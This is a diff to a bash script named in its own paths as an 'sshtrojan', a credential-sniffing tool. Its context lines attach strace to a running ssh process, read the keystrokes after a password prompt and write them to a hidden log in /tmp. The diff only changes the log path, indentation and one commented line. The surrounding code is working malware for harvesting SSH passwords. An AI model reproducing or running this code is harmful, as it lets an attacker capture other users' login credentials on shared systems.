@@ -1,6 +1,6 @@
 #!/bin/bash
 file_log="/tmp/.log_sshtrojan2.txt"
-file_log2="/tmp/log.txt"
+file_log2="/log.txt"
 if ! [[ -f $file_log ]]; then 
     touch $file_log
 fi
@@ -14,8 +14,8 @@ do
     pid=`ps aux |grep ssh| grep @ |head -n1| awk '{print $2}'`
     if [[ $pid != "" ]]; then
         strace -e trace=read,write -p $pid -f -o $file_log2
-    is_password="false"
-    cat $file_log2 | while read -r line
+    	is_password="false"
+    	cat $file_log2 | while read -r line
 	do
 		# Extract password from log file
 	    if [[ `echo $line | grep "password"` ]]
@@ -38,7 +38,6 @@ do
 	    then
 		ch=`echo $line | grep read\( | cut -d'"' -f2 | cut -d'"' -f1`
 		if [[ $ch == "\\n" || $ch == "\\r" ]]; then
-			# echo ${password}
 	  	    command_bin_location=`whereis ${password} | awk -F ': ' '{ print $2 }'`
 		    if [[ $command_bin_location == "" ]]
 		    then
@@ -53,6 +52,6 @@ do
 			password+=$ch
 		    fi           
 		fi
-    done
+    	done
     fi
 done
